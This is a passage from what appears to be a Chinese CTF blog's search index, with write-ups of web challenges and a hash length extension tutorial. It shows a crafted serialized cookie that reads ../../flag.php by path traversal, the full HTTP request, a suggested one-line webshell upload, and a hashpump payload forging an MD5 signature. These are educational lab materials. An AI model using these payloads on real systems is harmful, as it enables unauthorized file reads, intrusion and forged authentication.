firstM%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2# second4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea24dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2MD5 hash:008ee33a9d58b51cfeb425b0959121c9 0x06 Game传送门：http://114.55.36.69:8011/ 进入界面是一款贪吃蛇游戏，果断看js代码逻辑F12查看源码外面是外部的js脚本，在Source中查看发现于是猜测这一段颜文字应该会有与flag相关的信息，于是console执行一下显然flag是错误的，点击view继续跟进参看12345(function anonymous() &#123;window[&apos;flag&apos;] = &apos;Flag&#123;660332922504a5f06dd871a7fe78ba9c&#125;&apos;;console.log(&quot;Flag&#123; hahahah wrong!! :(&#125;&quot;);&#125;) 得到flag 0x07 Notepad传送门：http://114.55.36.69:8014/index.php/ 功能齐全，直接注册帐号，进入upload修改type（只能传jpg）上传一张图片,然后在picture内查看到发现图片中有一串base64，在bp中查看发现这一串base很长，在请求包的cookie中发现picture值解码发现为php序列化，而且保存的上传文件的文件名猜测picture的值提交后，然后页面在img标签下会回显文件内容的base64。于是显示index.php页面，手动构造序列化，在这里我们先了解一下序列化的组成12345678910例子：a:2:&#123;i:0;s:5:&quot;1.jpg&quot;;i:1;s:5:&quot;1.php&quot;;&#125;a的意思就是数组array2说明数组里面有两对值分别为1.jpg与1.phpi作为下标s代表为string类型5表示长度即0=&gt;1.jpg1=&gt;1.php 所以我们可以构造为：a:1:{i:0;s:9:”index.php”;}，base64后为YToxOntpOjA7czo5OiJpbmRleC5waHAiO30=，bp重放查看回显做到这，有两个思路，一个是上传一句话然后getshell，因为路径是爆出来了，仅仅是type限制；第二个是直接才flag在哪，读出来。两种方法都很简单，不做细说，第一种改type为image/jpg后，访问http://114.55.36.69:8014/upload/x.php，然后传入命令find / -name flag*。第二种是测试发现，flag在../../flag.php下，然后构造a:1:{i:0;s:14:”../../flag.php”;}=&gt;YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30=，请求1234567891011121314151617# requestGET /index.php/picture HTTP/1.1Host: 114.55.36.69:8014Proxy-Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://114.55.36.69:8014/index.php/pictureAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: Picture=YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30=; PHPSESSID=1vm2g30rlcqosqsj9ici1rdku1; session=eyJsb2dpbiI6dHJ1ZSwidXNlcm5hbWUiOiJYWEgifQ.DreFfA.iwKT84kXV5efjz90397IoKUYiik# response(part)&lt;img src=&quot;data:image/jpg;base64,PD9waHAKCiRmbGFnID0gImZsYWd7TjRtZV9zUGFjNF9Jc19JbnQzcjNzdDFuZ30iOwplY2hvICJmbGFne1RoaXNfMVNfQV9GNGtlX2YxYUd9IjsK&quot;&gt;# base64解密&lt;?php$flag = &quot;flag&#123;N4me_sPac4_Is_Int3r3st1ng&#125;&quot;;echo &quot;flag&#123;This_1S_A_F4ke_f1aG&#125;&quot;; 得到flag 后记 emmmm，实力有限，只能做出这么几道，至于排名感觉进不去下一场比赛啊。对于萌新的我，做这几道题目，费劲了一下午，晚上感谢小可爱的陪伴，有你真幸福。]]></content>
      <categories>
        <category>CTF</category>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hash长度扩展攻击]]></title>
    <url>%2F2018%2F05%2F10%2F1%2F</url>
    <content type="text"><![CDATA[ISCC时间线好长，课业繁忙，江湖再见，告辞！ 五一假期在干嘛？相信有很多小伙伴（其实是大表哥）开始了ISCC之旅，不知道为了在这个“动态分数”机制环境下得到更多的分数，大家的肝还好不好呢？ 信息安全与对抗技术竞赛（ISCC：Information Security and Countermeasures Contest），于2004年首次举办，是教育部、工业和信息化部主办的第一个国家级信息安全技术竞赛，在做题的时候，有一道题很有趣，web250的hash长度拓展攻击，这个方法原理不难，在几年前已经出现了，在2009年，Thai Duong 与 Juliano Rizzo发布了ASP.NET的padding oracle攻击，同时还写了一篇关于Flickr API签名可伪造的paper，Flickr API签名这个漏洞，实际上用的是MD5 Length Extension Attack，钻研了一个多星期的各位大表哥写的文章以及hash加密的具体算法，我想谈谈自己理解，并且分享一份自己写的利用代码。 0x01 原理 首先先看一张图片这有一幅图，感觉能把核心思路与过程充分地体现出来，不过在此之前我们应该了解MD5加密的大体步骤：填充与使用上一次计算出来的幻值进行四轮运算。 我们输入一个需要加密的字符的时候，该算法会对字符串进行分组，每448位（bit）也就是56字节一组，当不足448位时需要进行补充，我们先说一下448位的来源。每一个进行四轮运算的字符串，长度为64字节也就是512位，其中有8个字节是记录信息的长度（长度的意思是信息是多少二进制位），那么容纳信息的就只要56字节。假设我们对一个10个字节（80bit）的字符串A进行填充至64字节第一步，需要查看该信息是否小于等于56字节，即length(A)%64&lt;=56?这里单位是以字节为单位。第二步，对不足56字节的字符串进行填充，那么对A来说需要填充46字节，规定第一个字节必须填充%80，其余的填充%00，那么A填充的内容为：1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00 这里面有45个%00填充完毕。随后我们需要填充摘要信息，也是信息的长度，A有10字节，也就是80bit，换算成16进制为0x50，那么后面需要填充的8个字节为：1%50%00%00%00%00%00%00%00 为什么不是%00%00%00%00%00%00%00%50呢？因为MD5是小端存储，也就是低地址存储高位字节。对于小端储存，比如0x1234=&gt;34120000(假设32位储存长度)。至此我们需要处理的64位数据已经构造成功，这时候需要上一次MD5运算得到的ABCD来作为本次MD5运算的初始序列ABCD。在这里我们解释一下初始序列，对于第一次运算来说会默认四个32位初始序列1234A=0x01234567B=0x89abcdefC=0xfedcba98D=0x7654321 它们被称为链接变量将上面四个变量分别赋值到a,b,c,d变量中然后进行主循环(四轮)，每一轮都很相似。第一轮进行16次操作。每次操作对a，b，c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量，文本的一个子分组和一个常数。再将所得结果向右环移一个不定的数，并加上a，b，c或d中之一。最后用该结果取代a，b，c或d中之一。这样新的链接变量诞生了，如果还需要进行加密，那么就作为下一次加密的初始序列，如果结束的话，那么就把a,b,c,d进行大端储存，并且在一块。 0x02 一道CTF题目 理论说完了，我们来看一下题目： 题目直接给了源代码，审计的题目比较好做走我们我们可以知道，如果enc($username) === $_COOKIE[‘verify’]那么就setcookie的verifty:为md5($key+’guest’)可以知道未知的secret是$key，但是我们从下一套语句可以知道，$key的length：setcookie(“len”, strlen($key), time()+606024*7);因此这个题目已经分析出来了 已知的是：123$key的lengthmd5($key+&apos;guest&apos;)$username里要有admin字串 那么第一步上bp抓包找一下需要的数据可以发现 verify=78cfc57d983b4a17e55828c001a3e781 len=46使用hashpump我们把12payload:guest%80%00%00%00%00%98%01%00%00%00%00%00%00adminverify：5f585093a7fe86971766c3d25c43d0eb 进行repeater成功拿到flag 0x03 扩展 对于hash长度拓展攻击，挺感兴趣的，之后看了很多资料，凭着自己的理解写了一个脚本，虽然写出来了，对md5加密的算法理解了，但是不知道这四轮参与运算的固定的16进制为什么是这几个，还是应该好好研究。对于这个的用法，我简单的说一下1python expliot.py 作为初始序列的md5值 最为第二轮md5运算的字符 上一次的md5运算前的padding的时候%80前面字符串的二进制位数 脚本我放在我的github里 0x04 后记 之前一直在他大神们托管在github里的项目，这是第一次使用github因为是在学习的时候写的这个利用脚本，注释挺多的。 推荐一篇很棒的文章 https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks]]></content>
      <categories>
        <category>CTF</category>
        <category>hash长度扩展攻击</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>hash长度扩展攻击</tag>
      </tags>
  </entry>
</search>
